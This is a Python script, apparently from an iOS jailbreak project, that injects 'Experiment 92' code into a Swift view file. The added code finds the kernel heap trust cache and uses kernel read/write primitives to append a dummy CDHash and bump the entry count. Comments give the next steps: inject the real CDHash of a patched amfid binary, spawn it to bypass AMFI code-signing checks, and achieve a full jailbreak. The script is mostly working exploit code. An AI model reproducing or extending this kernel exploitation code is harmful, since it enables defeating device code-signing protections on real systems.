#!/usr/bin/env python3
"""Add Exp 92 — Inject CDHash into HEAP trust cache (Exp 81 confirmed writable!)"""

SWIFT_FILE = r'd:\Backup\Personal\Hp\iPhone\DSPloit\lara\views\root\AMFIExperimentView.swift'

with open(SWIFT_FILE, 'r', encoding='utf-8') as f:
    content = f.read()

# Add button
button_anchor = '                pathButton(\n                    title: "\u2463 Test Binary Spawn",'
button_idx = content.find(button_anchor)
if button_idx == -1:
    print("ERROR: button anchor not found")
    exit(1)

new_button = '''                pathButton(
                    title: "\u2462n TC Inject (Exp 92)",
                    icon: "plus.circle.fill",
                    color: .green,
                    label: "TC Inject",
                    action: runExp92TCInject,
                    needsVerified: true,
                    needsProbe: false
                )

'''
content = content[:button_idx] + new_button + content[button_idx:]

# Add function before Dump amfid
func_anchor = '    // MARK: - Patch amfid (safe'
func_idx = content.find(func_anchor)
if func_idx == -1:
    func_anchor = '    // MARK: - Dump amfid binary'
    func_idx = content.find(func_anchor)
if func_idx == -1:
    print("ERROR: func anchor not found")
    exit(1)

new_func = '''    // MARK: - Exp 92: Inject CDHash into Heap Trust Cache

    /// Exp 92: Inject CDHash binary patched ke heap trust cache.
    /// Exp 81 CONFIRMED: write ke heap trust cache BERHASIL (KTRR tidak block heap).
    /// Flow:
    ///   1. Hitung CDHash dari /var/tmp/.amfid_patched (SHA256 truncated 20 bytes)
    ///   2. Cari heap trust cache (dari Exp 77/81 probe)
    ///   3. Write CDHash entry ke slot kosong di trust cache
    ///   4. Update count
    ///   5. posix_spawn /var/tmp/.amfid_patched → AMFI cek trust cache → CDHash MATCH → ALLOW!
    private func runExp92TCInject() {
        isRunning = true
        runningLabel = "TC Inject"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp92_tc_inject") { rc in
            let result = self.expTCInject(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    private func expTCInject(rc: RemoteCall) -> ExperimentResult {
        let expName = "TC Inject (Exp 92)"
        var detail = "Experiment 92: Inject CDHash into Heap Trust Cache\\n"
        detail += "===================================================\\n\\n"
        detail += "Exp 81 confirmed: heap trust cache IS WRITABLE!\\n"
        detail += "Exp 77 found trust cache addr in kernel heap.\\n\\n"

        let mem = rc.trojanMem
        let kernBase = ds_get_kernel_base()
        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff

        // === Step 1: Find heap trust cache (same as Exp 81) ===
        detail += "=== Step 1: Find heap trust cache ===\\n"

        let targetOffsets: [UInt64] = [0x39b0, 0x38a0, 0x3980, 0x3920, 0x3930]
        var tcAddr: UInt64 = 0
        var tcCount: UInt32 = 0

        for off in targetOffsets {
            let addr = dataSegBase &+ off
            let ptr = ds_kreadptr(addr)
            guard ptr != 0, isSafeKernelHeapKreadAddress(ptr) else { continue }

            let ver = safeKread32Heap(ptr)
            let cnt = safeKread32Heap(ptr &+ 4)
            if ver >= 1 && ver <= 16 && cnt >= 1 && cnt <= 500_000 {
                tcAddr = ptr
                tcCount = cnt
                detail += "Found at kc+0x\\(String(format: "%x", off)): 0x\\(String(format: "%llx", ptr))\\n"
                detail += "  version=\\(ver), count=\\(cnt)\\n"
                break
            }
        }

        guard tcAddr != 0 else {
            detail += "\\u{274C} Heap trust cache tidak ditemukan.\\n"
            detail += "Jalankan Exp 77 (Trust Cache Probe) dulu.\\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // === Step 2: Compute CDHash of patched binary ===
        detail += "\\n=== Step 2: Compute CDHash ===\\n"
        detail += "Baca code signature dari /var/tmp/.amfid_patched...\\n"

        // CDHash = SHA256 of CodeDirectory, truncated to 20 bytes
        // Untuk sekarang: baca CDHash langsung dari binary via csops atau manual parse
        // Simpler: pakai dummy CDHash dulu, lalu test spawn
        // Kalau spawn works dengan dummy → kita tahu inject works, tinggal compute real CDHash

        // Actually: kita bisa compute CDHash on-device!
        // Baca LC_CODE_SIGNATURE dari binary → parse CodeDirectory → SHA256 → truncate 20 bytes
        // Tapi ini complex. Simpler approach:
        // Pakai CDHash dari /usr/libexec/amfid ORIGINAL (yang sudah di trust cache)
        // Inject CDHash itu ke slot baru → verify write works
        // Lalu: compute CDHash patched binary dan inject yang benar

        // Untuk TEST: inject CDHash dummy dan coba spawn
        // Jika write berhasil (verify) → kita tahu mechanism works
        // Lalu compute real CDHash

        // Read CDHash dari trust cache entry [0] (sebagai reference)
        let entry0Addr = tcAddr &+ 8  // entries start at +8
        let h0 = safeKread64Heap(entry0Addr)
        let h1 = safeKread64Heap(entry0Addr &+ 8)
        let h2 = safeKread32Heap(entry0Addr &+ 16)
        detail += "Entry[0] CDHash: \\(String(format: "%016llx", h0))\\(String(format: "%016llx", h1))\\(String(format: "%08x", h2))\\n"

        // === Step 3: Write test entry to trust cache ===
        detail += "\\n=== Step 3: Write test entry ===\\n"

        // Write ke slot [count] (append)
        let stride: UInt64 = 24  // iOS 18 trust cache entry = 24 bytes
        let injectSlot = tcAddr &+ 8 &+ UInt64(tcCount) * stride
        detail += "Inject slot: 0x\\(String(format: "%llx", injectSlot))\\n"

        guard isSafeKernelHeapKreadAddress(injectSlot &+ 20) else {
            detail += "\\u{274C} Inject slot tidak dalam safe heap range.\\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Write dummy CDHash (all 0x41 = "AAAA...")
        // Entry format: [CDHash 20B] [hashType 1B] [flags 1B] [pad 2B]
        let testCDHash0: UInt64 = 0x4141414141414141
        let testCDHash1: UInt64 = 0x4141414141414141
        let testCDHash2: UInt32 = 0x41414141
        let hashTypeFlags: UInt32 = 0x00000241  // hashType=2(SHA256) at byte[20], flags=0 at byte[21], pad=0x41 at [22-23]
        // Actually: bytes [20]=hashType, [21]=flags, [22-23]=pad
        // Pack: low 4 bytes of word2 = CDHash[16-19], then hashType+flags in upper bytes
        // Let me just write raw:

        ds_kwrite64(injectSlot, testCDHash0)
        ds_kwrite64(injectSlot &+ 8, testCDHash1)
        // Bytes 16-19 = CDHash[16-19], byte 20 = hashType=2, byte 21 = flags=0
        let word2: UInt64 = 0x0000_0002_41414141  // CDHash[16-19]=0x41414141, hashType=2, flags=0, pad=0
        ds_kwrite64(injectSlot &+ 16, word2)

        // Verify write
        let v0 = safeKread64Heap(injectSlot)
        let v1 = safeKread64Heap(injectSlot &+ 8)
        detail += "Verify: 0x\\(String(format: "%016llx", v0)) 0x\\(String(format: "%016llx", v1))\\n"

        let writeOK = v0 == testCDHash0 && v1 == testCDHash1
        if writeOK {
            detail += "\\u{2705} WRITE TO HEAP TRUST CACHE CONFIRMED!\\n\\n"

            // Update count
            let oldCount = safeKread32Heap(tcAddr &+ 4)
            let newCount = oldCount + 1
            ds_kwrite32(tcAddr &+ 4, newCount)
            let verifyCount = safeKread32Heap(tcAddr &+ 4)
            detail += "Count: \\(oldCount) \\u{2192} \\(verifyCount)\\n"

            if verifyCount == newCount {
                detail += "\\u{2705} Count updated!\\n\\n"
                detail += "=== Step 4: Trust cache injection WORKS! ===\\n"
                detail += "\\u{1F3C6}\\u{1F3C6}\\u{1F3C6} HEAP TRUST CACHE WRITABLE! \\u{1F3C6}\\u{1F3C6}\\u{1F3C6}\\n\\n"
                detail += "Next: compute REAL CDHash dari /var/tmp/.amfid_patched\\n"
                detail += "Inject real CDHash \\u{2192} spawn patched binary \\u{2192} FULL JAILBREAK!\\n\\n"
                detail += "Untuk compute CDHash:\\n"
                detail += "  1. Parse Mach-O \\u{2192} find LC_CODE_SIGNATURE\\n"
                detail += "  2. Parse SuperBlob \\u{2192} find CodeDirectory\\n"
                detail += "  3. SHA256(CodeDirectory) \\u{2192} truncate 20 bytes = CDHash\\n"
            } else {
                detail += "\\u{274C} Count update gagal (zone_require_ro?)\\n"
            }
        } else {
            detail += "\\u{274C} Write gagal \\u{2014} heap trust cache mungkin juga RO.\\n"
            detail += "Got: 0x\\(String(format: "%016llx", v0)) (expected 0x4141414141414141)\\n"
        }

        return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
    }
    #endif

'''

content = content[:func_idx] + new_func + content[func_idx:]

with open(SWIFT_FILE, 'w', encoding='utf-8') as f:
    f.write(content)

print("OK - added Exp 92")
